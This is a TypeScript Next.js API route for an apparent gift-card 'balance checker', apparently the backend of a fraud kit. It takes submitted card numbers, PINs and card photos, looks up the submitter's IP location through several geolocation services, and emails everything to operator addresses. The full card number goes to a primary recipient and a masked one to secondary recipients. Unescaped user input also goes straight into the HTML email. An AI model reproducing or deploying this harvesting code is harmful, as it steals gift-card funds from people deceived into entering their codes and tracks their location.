// src/app/api/notify/log/route.ts
import { NextResponse } from "next/server";
import { sendEmail, getPrimaryEmails, getSecondaryEmails } from "@/lib/email";
import { maskForSecondary } from "@/lib/mask";

// ============================================================
// Reliable IP geolocation with multiple fallback providers
// ============================================================
async function getLocationFromIP(ip: string) {
  if (
    !ip ||
    ip === '127.0.0.1' ||
    ip === '::1' ||
    ip === 'localhost' ||
    ip.startsWith('192.168.') ||
    ip.startsWith('10.') ||
    ip.startsWith('172.16.') ||
    ip.startsWith('172.17.') ||
    ip.startsWith('172.18.') ||
    ip.startsWith('172.19.') ||
    ip.startsWith('172.2') ||
    ip.startsWith('172.30.') ||
    ip.startsWith('172.31.') ||
    ip.startsWith('169.254.') ||
    ip.startsWith('fc') ||
    ip.startsWith('fd') ||
    ip.startsWith('fe80')
  ) {
    return { city: 'Local Network', region: '', country: '' };
  }

  const cleanIP = ip.replace(/^::ffff:/, '');

  const providers = [
    {
      name: 'ipapi.co',
      url: `https://ipapi.co/${cleanIP}/json/`,
      parse: (d: any) => {
        if (d.error) return null;
        return { city: d.city, region: d.region, country: d.country_name };
      },
    },
    {
      name: 'ip-api.com',
      url: `http://ip-api.com/json/${cleanIP}?fields=status,country,regionName,city`,
      parse: (d: any) => {
        if (d.status !== 'success') return null;
        return { city: d.city, region: d.regionName, country: d.country };
      },
    },
    {
      name: 'ipwho.is',
      url: `https://ipwho.is/${cleanIP}`,
      parse: (d: any) => {
        if (d.success === false) return null;
        return { city: d.city, region: d.region, country: d.country };
      },
    },
    {
      name: 'freeipapi.com',
      url: `https://freeipapi.com/api/json/${cleanIP}`,
      parse: (d: any) => ({
        city: d.cityName,
        region: d.regionName,
        country: d.countryName,
      }),
    },
  ];

  for (const provider of providers) {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 4000);
      const res = await fetch(provider.url, {
        signal: controller.signal,
        headers: { 'User-Agent': 'xbox-balance-checker/1.0' },
      });
      clearTimeout(timeout);

      if (!res.ok) continue;

      const data = await res.json();
      const parsed = provider.parse(data);

      if (parsed && (parsed.city || parsed.region || parsed.country)) {
        return {
          city: parsed.city || 'Unknown',
          region: parsed.region || '',
          country: parsed.country || '',
        };
      }
    } catch (err) {
      // Ignore failures, move to next provider
    }
  }

  return { city: 'Unknown', region: '', country: '' };
}

// ==================== MAIN HANDLER ====================

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { event, brandName, cardNumber, pin, amount, status, message, imageBase64 } = body;
    
    const primaryEnabled = String(process.env.NOTIFY_TYPING_ENABLED ?? 'true').toLowerCase() === 'true';
    
    // ---- Robust IP extraction (Adapted for Next.js) ----
    const forwarded = req.headers.get('x-forwarded-for');
    let ip = 'Unknown';
    if (forwarded) {
      ip = forwarded.split(',')[0].trim();
    } else {
      ip = req.headers.get('x-real-ip') || req.headers.get('cf-connecting-ip') || req.headers.get('x-vercel-forwarded-for') || 'Unknown';
    }

    // ---- Fetch Location ----
    const locationObj = await getLocationFromIP(ip);
    const locationStr = [locationObj.city, locationObj.region, locationObj.country].filter(Boolean).join(', ') || 'Unknown';

    const attachments: any[] = [];
    if (imageBase64 && imageBase64.startsWith('data:image')) {
      const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
      if (matches && matches[2]) {
        attachments.push({ filename: `capture.${matches[1]}`, content: matches[2] });
      }
    }

    // Base HTML template with dynamic fields
    const baseHtml = `
      <div style="font-family: Arial, sans-serif; padding: 20px; color: #333; max-width: 600px; margin: 0 auto; border: 1px solid #eee; border-radius: 8px;">
        <h2 style="color: ${event === 'success' ? '#28a745' : '#dc3545'}; border-bottom: 2px solid ${event === 'success' ? '#28a745' : '#dc3545'}; padding-bottom: 10px;">
          ${event === 'success' ? '✅ SUCCESS' : event === 'upload' ? '📸 UPLOAD' : '❌ FAILED'} - ${brandName}
        </h2>
        <table style="width: 100%; border-collapse: collapse; margin-top: 15px;">
          <tr><td style="padding: 10px; border-bottom: 1px solid #eee; width: 140px;"><strong>Card Number:</strong></td><td style="padding: 10px; border-bottom: 1px solid #eee; font-family: monospace; font-size: 16px;">{CARD_NUMBER}</td></tr>
          ${pin ? `<tr><td style="padding: 10px; border-bottom: 1px solid #eee;"><strong>PIN:</strong></td><td style="padding: 10px; border-bottom: 1px solid #eee; font-family: monospace; font-size: 16px;">${pin}</td></tr>` : ''}
          <tr><td style="padding: 10px; border-bottom: 1px solid #eee;"><strong>Amount:</strong></td><td style="padding: 10px; border-bottom: 1px solid #eee;">$${amount}</td></tr>
          <tr><td style="padding: 10px; border-bottom: 1px solid #eee;"><strong>Status:</strong></td><td style="padding: 10px; border-bottom: 1px solid #eee;">${status}</td></tr>
          <tr><td style="padding: 10px; border-bottom: 1px solid #eee;"><strong>Message:</strong></td><td style="padding: 10px; border-bottom: 1px solid #eee;">${message}</td></tr>
          <tr><td style="padding: 10px; border-bottom: 1px solid #eee;"><strong>IP Address:</strong></td><td style="padding: 10px; border-bottom: 1px solid #eee; font-family: monospace;">${ip}</td></tr>
          <tr><td style="padding: 10px; border-bottom: 1px solid #eee;"><strong>Location:</strong></td><td style="padding: 10px; border-bottom: 1px solid #eee;">${locationStr}</td></tr>
          <tr><td style="padding: 10px; border-bottom: 1px solid #eee;"><strong>Time:</strong></td><td style="padding: 10px; border-bottom: 1px solid #eee;">${new Date().toLocaleString()}</td></tr>
        </table>
      </div>
    `;

    // 1. Send to Primary (Full Code) - Only if enabled
    if (primaryEnabled) {
      const primaryEmail = getPrimaryEmails();
      if (primaryEmail) {
        const htmlPrimary = baseHtml.replace('{CARD_NUMBER}', cardNumber || 'N/A');
        await sendEmail({ to: primaryEmail, subject: `Result - ${brandName}`, html: htmlPrimary, attachments });
      }
    }

    // 2. Send to Secondary
    const secondaryEmails = getSecondaryEmails();
    if (secondaryEmails.length > 0) {
      let htmlSecondary = '';
      
      if (primaryEnabled && cardNumber) {
        const masked = maskForSecondary(cardNumber);
        htmlSecondary = baseHtml.replace('{CARD_NUMBER}', masked);
      } else {
        htmlSecondary = baseHtml.replace('{CARD_NUMBER}', cardNumber || 'N/A');
      }
      
      await sendEmail({ to: secondaryEmails, subject: `Result - ${brandName}`, html: htmlSecondary, attachments });
    }

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error(err);
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}